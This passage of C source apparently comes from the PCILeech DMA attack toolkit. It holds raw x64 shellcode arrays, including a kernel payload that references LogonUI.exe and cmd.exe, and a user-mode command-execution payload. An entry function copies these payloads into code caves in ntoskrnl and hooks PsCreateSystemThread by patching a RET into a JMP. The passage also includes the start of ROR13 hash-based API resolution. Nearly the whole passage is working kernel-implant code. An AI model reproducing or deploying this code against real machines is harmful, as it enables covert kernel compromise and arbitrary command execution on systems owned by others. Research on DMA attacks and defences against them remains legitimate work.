		0xc6, 0x48, 0x89, 0xbd, 0x30, 0x02, 0x00, 0x00, 0x48, 0x89, 0xb5, 0x38,
		0x02, 0x00, 0x00, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24,
		0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48,
		0x83, 0xc4, 0x30, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24,
		0x08, 0x55, 0x48, 0x8d, 0xac, 0x24, 0x50, 0xff, 0xff, 0xff, 0x48, 0x81,
		0xec, 0xb0, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x55, 0xe0,
		0x48, 0x8b, 0x49, 0x08, 0xe8, 0x13, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4b,
		0x08, 0x48, 0x8d, 0x54, 0x24, 0x50, 0xe8, 0x1d, 0xfd, 0xff, 0xff, 0xb8,
		0x01, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x4c, 0x6f, 0x67, 0x6f,
		0x4c, 0x8d, 0x8b, 0x20, 0x01, 0x00, 0x00, 0x48, 0x89, 0x83, 0x30, 0x01,
		0x00, 0x00, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x89, 0x83, 0x40, 0x01,
		0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x50, 0xc7, 0x44, 0x24, 0x24, 0x6e,
		0x55, 0x49, 0x2e, 0x48, 0x8d, 0x4d, 0xe0, 0xc7, 0x44, 0x24, 0x28, 0x65,
		0x78, 0x65, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x63, 0x3a, 0x5c, 0x77, 0xc7,
		0x44, 0x24, 0x34, 0x69, 0x6e, 0x64, 0x6f, 0xc7, 0x44, 0x24, 0x38, 0x77,
		0x73, 0x5c, 0x73, 0xc7, 0x44, 0x24, 0x3c, 0x79, 0x73, 0x74, 0x65, 0xc7,
		0x44, 0x24, 0x40, 0x6d, 0x33, 0x32, 0x5c, 0xc7, 0x44, 0x24, 0x44, 0x63,
		0x6d, 0x64, 0x2e, 0xc7, 0x44, 0x24, 0x48, 0x65, 0x78, 0x65, 0x00, 0x48,
		0xc7, 0x83, 0x28, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0xe8, 0x21,
		0xfb, 0xff, 0xff, 0x48, 0x63, 0xc8, 0x48, 0x89, 0x8b, 0x20, 0x02, 0x00,
		0x00, 0x85, 0xc0, 0x74, 0x0d, 0x48, 0xc7, 0x83, 0x28, 0x02, 0x00, 0x00,
		0x01, 0x01, 0x00, 0x00, 0xeb, 0x26, 0x48, 0x8d, 0x8b, 0x00, 0x04, 0x00,
		0x00, 0x41, 0xb8, 0x1c, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x30,
		0xff, 0x55, 0x40, 0x4c, 0x8d, 0x44, 0x24, 0x50, 0x48, 0x8b, 0xcb, 0x48,
		0x8d, 0x55, 0xe0, 0xe8, 0x98, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24,
		0xc0, 0x01, 0x00, 0x00, 0x48, 0x81, 0xc4, 0xb0, 0x01, 0x00, 0x00, 0x5d,
		0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x8b, 0xc2, 0x4c, 0x8d,
		0x44, 0x24, 0x30, 0x48, 0x69, 0xd0, 0xf0, 0xd8, 0xff, 0xff, 0x4c, 0x8b,
		0xc9, 0x33, 0xc9, 0x48, 0x89, 0x54, 0x24, 0x30, 0x33, 0xd2, 0x41, 0xff,
		0x51, 0x20, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
		0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c,
		0x89, 0x70, 0x20, 0x55, 0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0x90,
		0x00, 0x00, 0x00, 0x4c, 0x8b, 0xf1, 0xc7, 0x45, 0xe7, 0x4a, 0x45, 0x3b,
		0xd7, 0xc7, 0x45, 0xeb, 0x62, 0xe0, 0x07, 0x37, 0x48, 0x8d, 0xba, 0xc8,
		0x00, 0x00, 0x00, 0xc7, 0x45, 0xef, 0x1f, 0x9d, 0x48, 0x9d, 0x48, 0x8d,
		0x75, 0x4b, 0xc7, 0x45, 0xf3, 0xa1, 0x7b, 0xcc, 0xdc, 0xbb, 0x19, 0x00,
		0x00, 0x00, 0xc7, 0x45, 0xf7, 0x92, 0x6d, 0x58, 0x58, 0xc7, 0x45, 0xfb,
		0xce, 0xad, 0x90, 0x4d, 0xc7, 0x45, 0xff, 0x57, 0x63, 0x32, 0x5a, 0xc7,
		0x45, 0x03, 0x8f, 0xb5, 0x6a, 0x6a, 0xc7, 0x45, 0x07, 0xf9, 0xbe, 0xdd,
		0x05, 0xc7, 0x45, 0x0b, 0xf7, 0x38, 0xb3, 0x9d, 0xc7, 0x45, 0x0f, 0xc9,
		0xc5, 0x6e, 0x6c, 0xc7, 0x45, 0x13, 0x89, 0x83, 0x6c, 0xeb, 0xc7, 0x45,
		0x17, 0x9b, 0x97, 0x64, 0xcf, 0xc7, 0x45, 0x1b, 0x2a, 0xc0, 0xb2, 0xa8,
		0xc7, 0x45, 0x1f, 0x3d, 0x28, 0xc3, 0x7c, 0xc7, 0x45, 0x23, 0x2a, 0xd0,
		0x35, 0x30, 0xc7, 0x45, 0x27, 0xdb, 0x4f, 0x3d, 0xc5, 0xc7, 0x45, 0x2b,
		0x61, 0x4c, 0x04, 0x5d, 0xc7, 0x45, 0x2f, 0x9d, 0x8f, 0xa0, 0xc3, 0xc7,
		0x45, 0x33, 0xb8, 0xd4, 0x29, 0x88, 0xc7, 0x45, 0x37, 0x50, 0x64, 0xb0,
		0x6f, 0xc7, 0x45, 0x3b, 0xe2, 0xca, 0x61, 0xe6, 0xc7, 0x45, 0x3f, 0xde,
		0x24, 0xe6, 0xf7, 0xc7, 0x45, 0x43, 0x16, 0x35, 0xfd, 0x87, 0xc7, 0x45,
		0x47, 0x36, 0x31, 0x0e, 0x68, 0x48, 0x8d, 0x76, 0xfc, 0x49, 0x8b, 0xce,
		0x8b, 0x16, 0x48, 0x8d, 0x7f, 0xf8, 0xe8, 0x25, 0x00, 0x00, 0x00, 0x48,
		0x89, 0x07, 0x83, 0xc3, 0xff, 0x75, 0xe6, 0x4c, 0x8d, 0x9c, 0x24, 0x90,
		0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49,
		0x8b, 0x7b, 0x20, 0x4d, 0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x5d, 0xc3,
		0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x8b, 0xea, 0x48, 0x85, 0xc9,
		0x74, 0x7a, 0xb8, 0x4d, 0x5a, 0x00, 0x00, 0x66, 0x39, 0x01, 0x75, 0x70,
		0x48, 0x63, 0x41, 0x3c, 0x48, 0x03, 0xc1, 0x74, 0x67, 0x81, 0x38, 0x50,
		0x45, 0x00, 0x00, 0x75, 0x5f, 0x8b, 0x90, 0x88, 0x00, 0x00, 0x00, 0x48,
		0x03, 0xd1, 0x74, 0x54, 0x44, 0x8b, 0x5a, 0x18, 0x45, 0x85, 0xdb, 0x74,
		0x4b, 0x8b, 0x42, 0x20, 0x85, 0xc0, 0x74, 0x44, 0x8b, 0x72, 0x24, 0x4c,
		0x8d, 0x0c, 0x01, 0x8b, 0x7a, 0x1c, 0x48, 0x03, 0xf1, 0x48, 0x03, 0xf9,
		0x45, 0x33, 0xc0, 0x45, 0x85, 0xdb, 0x74, 0x2c, 0x45, 0x8b, 0x11, 0x4c,
		0x03, 0xd1, 0x33, 0xdb, 0xeb, 0x0b, 0x0f, 0xb6, 0xc0, 0x49, 0xff, 0xc2,
		0xc1, 0xcb, 0x0d, 0x03, 0xd8, 0x41, 0x8a, 0x02, 0x84, 0xc0, 0x75, 0xee,
		0x3b, 0xdd, 0x74, 0x23, 0x41, 0xff, 0xc0, 0x49, 0x83, 0xc1, 0x04, 0x45,
		0x3b, 0xc3, 0x72, 0xd4, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48,
		0x8b, 0x6c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x48, 0x8b, 0x7c,
		0x24, 0x20, 0xc3, 0x46, 0x0f, 0xb7, 0x04, 0x46, 0x44, 0x3b, 0x42, 0x14,
		0x73, 0xde, 0x42, 0x8b, 0x04, 0x87, 0x48, 0x03, 0xc1, 0xeb, 0xd7
	};
	*ppb = WINX64_PSCMD_KERNEL_BIN;
	*pcb = sizeof(WINX64_PSCMD_KERNEL_BIN);
}

// standard wx64_exec_user payload, compile and extract shellcode with:
// 
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC wx64_exec_user_c.c
// ml64 wx64_exec_user.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_exec_user_c.obj
// shellcode64.exe -o wx64_exec_user.exe
// xxd -i wx64_exec_user.bin
VOID GetData_PSCMD_USER(PBYTE *ppb, PDWORD pcb)
{
	BYTE WINX64_PSCMD_USER_BIN[] = {
		0xb0, 0x00, 0xb2, 0x01, 0x48, 0x8d, 0x0d, 0x49, 0x00, 0x00, 0x00, 0xf0,
		0x0f, 0xb0, 0x11, 0x75, 0x42, 0x48, 0x8d, 0x0d, 0xe8, 0xff, 0xff, 0xff,
		0x48, 0x81, 0xe1, 0x00, 0xf0, 0xff, 0xff, 0x65, 0x48, 0x8b, 0x14, 0x25,
		0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18,
		0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x12, 0x48, 0x8b,
		0x52, 0x20, 0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83,
		0xec, 0x20, 0xe8, 0xe1, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xe6, 0x5e, 0xc3,
		0x00, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
		0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x48, 0x63, 0x41, 0x3c, 0x4c,
		0x8b, 0xc9, 0x8b, 0xf2, 0x44, 0x8b, 0x84, 0x08, 0x88, 0x00, 0x00, 0x00,
		0x4c, 0x03, 0xc1, 0x45, 0x8b, 0x50, 0x20, 0x45, 0x8b, 0x58, 0x24, 0x4c,
		0x03, 0xd1, 0x41, 0x8b, 0x58, 0x1c, 0x4c, 0x03, 0xd9, 0x41, 0x8b, 0x78,
		0x18, 0x48, 0x03, 0xd9, 0x33, 0xc9, 0x85, 0xff, 0x74, 0x2d, 0x41, 0x8b,
		0x12, 0x49, 0x03, 0xd1, 0x45, 0x33, 0xc0, 0xeb, 0x0d, 0x0f, 0xb6, 0xc0,
		0x48, 0xff, 0xc2, 0x41, 0xc1, 0xc8, 0x0d, 0x44, 0x03, 0xc0, 0x8a, 0x02,
		0x84, 0xc0, 0x75, 0xed, 0x44, 0x3b, 0xc6, 0x74, 0x1c, 0xff, 0xc1, 0x49,
		0x83, 0xc2, 0x04, 0x3b, 0xcf, 0x72, 0xd3, 0x33, 0xc0, 0x48, 0x8b, 0x5c,
		0x24, 0x08, 0x48, 0x8b, 0x74, 0x24, 0x10, 0x48, 0x8b, 0x7c, 0x24, 0x18,
		0xc3, 0x41, 0x0f, 0xb7, 0x0c, 0x4b, 0x8b, 0x04, 0x8b, 0x49, 0x03, 0xc1,
		0xeb, 0xe3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b,
		0x41, 0x78, 0x48, 0x8b, 0xd9, 0x33, 0xc9, 0x48, 0x89, 0x08, 0x39, 0x8b,
		0x88, 0x00, 0x00, 0x00, 0x74, 0x22, 0x89, 0x8b, 0x88, 0x00, 0x00, 0x00,
		0x48, 0x8b, 0x4b, 0x58, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x4b, 0x50, 0xff,
		0x53, 0x08, 0x48, 0x8b, 0x4b, 0x60, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x4b,
		0x68, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x43, 0x70, 0x48, 0xb9, 0xac, 0xda,
		0x37, 0x13, 0x00, 0x22, 0xda, 0xfe, 0x48, 0x89, 0x08, 0x48, 0x8b, 0x43,
		0x78, 0x48, 0x89, 0x08, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc,
		0x40, 0x53, 0x48, 0x83, 0xec, 0x70, 0xba, 0x68, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0xd9, 0x8d, 0x4a, 0xd8, 0xff, 0x53, 0x30, 0xc7, 0x00, 0x68, 0x00,
		0x00, 0x00, 0xc7, 0x40, 0x3c, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x13,
		0x48, 0x83, 0xba, 0x08, 0x01, 0x00, 0x00, 0x00, 0x74, 0x18, 0x48, 0x8b,
		0x4b, 0x60, 0x48, 0x89, 0x48, 0x58, 0x48, 0x8b, 0x4b, 0x68, 0x48, 0x89,
		0x48, 0x50, 0x48, 0x8b, 0x4b, 0x60, 0x48, 0x89, 0x48, 0x60, 0x48, 0x8b,
		0x13, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x4c, 0x24, 0x48, 0x45,
		0x33, 0xc9, 0x48, 0x89, 0x44, 0x24, 0x40, 0x45, 0x33, 0xc0, 0x48, 0x83,
		0x64, 0x24, 0x38, 0x00, 0x33, 0xc9, 0x48, 0x83, 0x64, 0x24, 0x30, 0x00,
		0x8b, 0x82, 0x10, 0x01, 0x00, 0x00, 0x89, 0x44, 0x24, 0x28, 0xc7, 0x44,
		0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0xff, 0x53, 0x18, 0x85, 0xc0, 0x74,
		0x26, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x8b, 0x80, 0x00, 0x00,
		0x00, 0x48, 0x8b, 0x0b, 0x48, 0x83, 0xb9, 0x08, 0x01, 0x00, 0x00, 0x00,
		0x74, 0x08, 0x48, 0x8b, 0x4c, 0x24, 0x58, 0xff, 0x53, 0x08, 0xb8, 0x01,
		0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x70, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc,
		0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xe9, 0xc7,
		0x40, 0xc8, 0xfb, 0x97, 0xfd, 0x0f, 0xc7, 0x40, 0xcc, 0x80, 0x8f, 0x0c,
		0x17, 0x48, 0x8d, 0x7a, 0x48, 0xc7, 0x40, 0xd0, 0x72, 0xfe, 0xb3, 0x16,
		0x48, 0x8d, 0x70, 0xec, 0xc7, 0x40, 0xd4, 0x6b, 0xd0, 0x2b, 0xca, 0xbb,
		0x09, 0x00, 0x00, 0x00, 0xc7, 0x40, 0xd8, 0x74, 0xab, 0x30, 0xac, 0xc7,
		0x40, 0xdc, 0xfa, 0x97, 0x02, 0x4c, 0xc7, 0x40, 0xe0, 0x16, 0x65, 0xfa,
		0x10, 0xc7, 0x40, 0xe4, 0xb0, 0x49, 0x2d, 0xdb, 0xc7, 0x40, 0xe8, 0x1f,
		0x79, 0x0a, 0xe8, 0x48, 0x8d, 0x76, 0xfc, 0x48, 0x8b, 0xcd, 0x8b, 0x16,
		0x48, 0x8d, 0x7f, 0xf8, 0xe8, 0xeb, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x07,
		0x83, 0xc3, 0xff, 0x75, 0xe6, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b,
		0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x50,
		0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xc1, 0x48,
		0x8d, 0x54, 0x24, 0x30, 0x48, 0x8b, 0x89, 0x80, 0x00, 0x00, 0x00, 0xff,
		0x50, 0x28, 0x33, 0xc9, 0x85, 0xc0, 0x74, 0x0f, 0x81, 0x7c, 0x24, 0x30,
		0x03, 0x01, 0x00, 0x00, 0x75, 0x05, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x8b,
		0xc1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24,
		0x10, 0x56, 0x48, 0x83, 0xec, 0x30, 0x83, 0xb9, 0x88, 0x00, 0x00, 0x00,
		0x00, 0x48, 0x8b, 0xd9, 0x0f, 0x84, 0xab, 0x00, 0x00, 0x00, 0xbe, 0x00,
		0x08, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xe8, 0xa5, 0xff, 0xff, 0xff, 0x85,
		0xc0, 0x0f, 0x84, 0x96, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x43, 0x70, 0x4c,
		0x8b, 0x4b, 0x78, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x8b, 0x48, 0x10,
		0x41, 0x8b, 0x51, 0x08, 0x81, 0xe1, 0xff, 0x07, 0x00, 0x00, 0x81, 0xe2,
		0xff, 0x07, 0x00, 0x00, 0x3b, 0xca, 0x8b, 0xc2, 0x48, 0x8b, 0x4b, 0x58,
		0x77, 0x08, 0x44, 0x8b, 0xc6, 0x44, 0x2b, 0xc2, 0xeb, 0x03, 0x45, 0x33,
		0xc0, 0x49, 0x8d, 0x51, 0x68, 0x48, 0x03, 0xd0, 0x4c, 0x8d, 0x4c, 0x24,
		0x40, 0xff, 0x53, 0x38, 0x85, 0xc0, 0x74, 0x4d, 0x48, 0x8b, 0x4b, 0x78,
		0x8b, 0x44, 0x24, 0x40, 0x48, 0x01, 0x41, 0x08, 0xeb, 0x1d, 0x83, 0xbb,
		0x88, 0x00, 0x00, 0x00, 0x00, 0x74, 0x36, 0x48, 0x8b, 0xcb, 0xe8, 0x35,
		0xff, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x1d, 0xb9, 0x0a, 0x00, 0x00, 0x00,
		0xff, 0x53, 0x40, 0x48, 0x8b, 0x4b, 0x78, 0x48, 0x8b, 0x43, 0x70, 0x48,
		0x8b, 0x49, 0x08, 0x48, 0x2b, 0x48, 0x10, 0x48, 0x3b, 0xce, 0x73, 0xce,
		0x83, 0xbb, 0x88, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x85, 0x5a, 0xff, 0xff,
		0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x5b, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x5c,
		0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5e, 0xc3, 0x40, 0x53, 0x48, 0x83,
		0xec, 0x30, 0x83, 0xb9, 0x88, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd9,
		0x74, 0x78, 0x48, 0x8b, 0xcb, 0xe8, 0xda, 0xfe, 0xff, 0xff, 0x85, 0xc0,
		0x74, 0x6c, 0x48, 0x8b, 0x53, 0x78, 0x48, 0x8b, 0x4b, 0x70, 0x48, 0x8b,
		0x42, 0x10, 0x48, 0x39, 0x41, 0x08, 0x75, 0x0a, 0xb9, 0x0a, 0x00, 0x00,
		0x00, 0xff, 0x53, 0x40, 0xeb, 0x47, 0x44, 0x8b, 0x41, 0x08, 0x48, 0x8d,
		0x51, 0x68, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x4c, 0x8d, 0x4c, 0x24,
		0x40, 0x48, 0x8b, 0x4b, 0x50, 0x25, 0xff, 0x07, 0x00, 0x00, 0x41, 0x81,
		0xe0, 0xff, 0x07, 0x00, 0x00, 0x48, 0x03, 0xd0, 0x41, 0x3b, 0xc0, 0x72,
		0x06, 0x41, 0xb8, 0x00, 0x08, 0x00, 0x00, 0x44, 0x2b, 0xc0, 0xff, 0x53,
		0x48, 0x85, 0xc0, 0x74, 0x15, 0x48, 0x8b, 0x4b, 0x78, 0x8b, 0x44, 0x24,
		0x40, 0x48, 0x01, 0x41, 0x10, 0x83, 0xbb, 0x88, 0x00, 0x00, 0x00, 0x00,
		0x75, 0x88, 0x48, 0x8b, 0xcb, 0xe8, 0xbe, 0xfc, 0xff, 0xff, 0x48, 0x83,
		0xc4, 0x30, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
		0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xfa, 0x48, 0x8b,
		0xd9, 0x48, 0x8b, 0xcf, 0xba, 0xfa, 0x97, 0x02, 0x4c, 0xe8, 0x06, 0xfc,
		0xff, 0xff, 0xba, 0x90, 0x00, 0x00, 0x00, 0x8d, 0x4a, 0xb0, 0xff, 0xd0,
		0x48, 0x8d, 0x8b, 0xe8, 0x0e, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x89,
		0x08, 0x48, 0x8d, 0x50, 0x08, 0x48, 0x8b, 0xcf, 0xe8, 0x83, 0xfd, 0xff,
		0xff, 0x48, 0x8b, 0x0e, 0x48, 0x83, 0xb9, 0x08, 0x01, 0x00, 0x00, 0x00,
		0x74, 0x7b, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x4c, 0x8d, 0x44, 0x24,
		0x30, 0xc7, 0x44, 0x24, 0x30, 0x18, 0x00, 0x00, 0x00, 0x48, 0xba, 0x21,
		0x95, 0xef, 0xdf, 0x32, 0x12, 0x65, 0x12, 0xbf, 0x01, 0x00, 0x00, 0x00,
		0xbb, 0x00, 0x08, 0x00, 0x00, 0x89, 0x7c, 0x24, 0x40, 0x44, 0x8b, 0xcb,
		0x48, 0x8b, 0x06, 0x48, 0x8b, 0x88, 0x08, 0x01, 0x00, 0x00, 0x48, 0x89,
		0x4e, 0x70, 0x48, 0x8b, 0x80, 0x08, 0x01, 0x00, 0x00, 0x48, 0x05, 0x00,
		0x10, 0x00, 0x00, 0x48, 0x89, 0x46, 0x78, 0x48, 0x89, 0x11, 0x48, 0x8d,
		0x4e, 0x68, 0x48, 0x8b, 0x46, 0x78, 0x48, 0x89, 0x10, 0x48, 0x8d, 0x56,
		0x50, 0xff, 0x56, 0x10, 0x48, 0x8d, 0x56, 0x60, 0x44, 0x8b, 0xcb, 0x48,
		0x8d, 0x4e, 0x58, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0xff, 0x56, 0x10, 0x89,
		0xbe, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xe8, 0x3f, 0xfc, 0xff,
		0xff, 0x85, 0xc0, 0x75, 0x0a, 0x48, 0x8b, 0xce, 0xe8, 0xd7, 0xfb, 0xff,
		0xff, 0xeb, 0x45, 0x48, 0x8b, 0x06, 0x48, 0x83, 0xb8, 0x08, 0x01, 0x00,
		0x00, 0x00, 0x74, 0x38, 0x48, 0x83, 0x64, 0x24, 0x28, 0x00, 0x4c, 0x8d,
		0x05, 0x6b, 0xfe, 0xff, 0xff, 0x83, 0x64, 0x24, 0x20, 0x00, 0x4c, 0x8b,
		0xce, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x56, 0x20, 0x48, 0x83, 0x64, 0x24,
		0x28, 0x00, 0x4c, 0x8d, 0x05, 0x77, 0xfd, 0xff, 0xff, 0x83, 0x64, 0x24,
		0x20, 0x00, 0x4c, 0x8b, 0xce, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x56, 0x20,
		0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83,
		0xc4, 0x50, 0x5f, 0xc3
	};
	*ppb = WINX64_PSCMD_USER_BIN;
	*pcb = sizeof(WINX64_PSCMD_USER_BIN);
}

// ----------------------------------------------------------------------------
// CORE LOGIC/MASTER FUNCTIONALITY BELOW:
// ----------------------------------------------------------------------------

#define H_PsCreateSystemThread          0x94a06b02
VOID c_EntryPoint(PKMDDATA pk)
{
	PBYTE pbData;
	DWORD cbData;
	QWORD hModuleNTOSKRNL, hPsCreateSystemThread, hHookFn, hHook;
	QWORD hKMD, hVFS, hPSCMD_KERNEL, hPSCMD_USER;
	DWORD dwOffsetRET = 0, dwOffsetJMP;
	// locate ntoskrnl.exe
	hModuleNTOSKRNL = FindNtoskrnl();
	if(!hModuleNTOSKRNL) {
		pk->dataOut[0] = 0xf0000001;
		return;
	}
	pk->dataOut[1] = hModuleNTOSKRNL;
	// locate hook function - PsCreateSystemThreadEx
	hPsCreateSystemThread = PEGetProcAddressH(hModuleNTOSKRNL, H_PsCreateSystemThread);
	if(!hPsCreateSystemThread) {
		pk->dataOut[0] = 0xf0000002;
		return;
	}
	hHookFn = hPsCreateSystemThread;
	pk->dataOut[2] = hHookFn;
	// hook : locate, but do not patch yet.
	while(TRUE) {
		if((*(PBYTE)(hHookFn + dwOffsetRET) == 0xC3 /* RET */) && (*(PDWORD)(hHookFn + dwOffsetRET + 1) == 0xCCCCCCCC /* PAD */)) {
			break;
		}
		if(dwOffsetRET == 0x100) {
			pk->dataOut[0] = 0xf0000003;
			return;
		}
		dwOffsetRET++;
	}
	hHook = hHookFn + dwOffsetRET;
	// code cave : locate and patch in VFS (virtual file system) module.
	GetData_VFS(&pbData, &cbData);
	hVFS = FindCodeCave(hModuleNTOSKRNL, cbData);
	if(!hVFS) {
		pk->dataOut[0] = 0xf0000004;
		return;
	}
	pk->dataOut[3] = hVFS;
	CopyMem((PVOID)hVFS, (PVOID)pbData, cbData);
	// code cave : locate and patch in KMD (windows pcileech kernel module).
	GetData_KMD(&pbData, &cbData);
	hKMD = FindCodeCave(hModuleNTOSKRNL, cbData);
	if(!hKMD) {
		pk->dataOut[0] = 0xf0000005;
		return;
	}
	pk->dataOut[4] = hKMD;
	CopyMem((PVOID)hKMD, (PVOID)pbData, cbData);
	// code cave : locate and patch in pscmd kernelmode code.
	GetData_PSCMD_KERNEL(&pbData, &cbData);
	hPSCMD_KERNEL = FindCodeCave(hModuleNTOSKRNL, cbData);
	if(!hPSCMD_KERNEL) {
		pk->dataOut[0] = 0xf0000006;
		return;
	}
	pk->dataOut[5] = hPSCMD_KERNEL;
	CopyMem((PVOID)hPSCMD_KERNEL, (PVOID)pbData, cbData);
	// code cave : locate and patch in pscmd usermode code.
	GetData_PSCMD_USER(&pbData, &cbData);
	hPSCMD_USER = FindCodeCave(hModuleNTOSKRNL, cbData);
	if(!hPSCMD_USER) {
		pk->dataOut[0] = 0xf0000006;
		return;
	}
	pk->dataOut[6] = hPSCMD_USER;
	CopyMem((PVOID)hPSCMD_USER, (PVOID)pbData, cbData);
	// patch in offsets in KMD code
	*(PWORD)(hKMD + 0x02) = pk->dataIn[0] ? (WORD)pk->dataIn[0] : 0x0045;
	*(PDWORD)(hKMD + 0x04) = (DWORD)hModuleNTOSKRNL;
	*(PDWORD)(hKMD + 0x08) = (DWORD)hKMD;
	*(PDWORD)(hKMD + 0x0C) = (DWORD)hVFS;
	*(PDWORD)(hKMD + 0x10) = (DWORD)hPSCMD_KERNEL;
	*(PDWORD)(hKMD + 0x14) = (DWORD)hPSCMD_USER;
	// hook function by patching RET instruction
	dwOffsetJMP = (DWORD)hKMD - ((DWORD)hHook + 5);
	*(PBYTE)(hHook) = 0xE9;					// JMP
	*(PDWORD)(hHook + 1) = dwOffsetJMP;		// JMP ADDR
}

```

`pcileech_shellcode/wx64_common.c`:

```c
// wx64_common.c : support functions used by Windows x64 KMDs started by stage3 EXEC.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//

#include "wx64_common.h"

DWORD HashROR13A(_In_ LPCSTR sz)
{
	DWORD dwVal, dwHash = 0;
	while(*sz) {
		dwVal = (DWORD)*sz++;
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash += dwVal;
	}
	return dwHash;
}

QWORD PEGetProcAddressH(_In_ QWORD hModule, _In_ DWORD dwProcNameH)
{
	PDWORD pdwRVAAddrNames, pdwRVAAddrFunctions;
	PWORD pwNameOrdinals;
	DWORD i, dwFnIdx, dwHash;
	LPSTR sz;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	if(!dosHeader || dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { return 0; }
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModule + dosHeader->e_lfanew); // nt header
	if(!ntHeader || ntHeader->Signature != IMAGE_NT_SIGNATURE) { return 0; }
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule);
	if(!exp || !exp->NumberOfNames || !exp->AddressOfNames) { return 0; }
	pdwRVAAddrNames = (PDWORD)(hModule + exp->AddressOfNames);
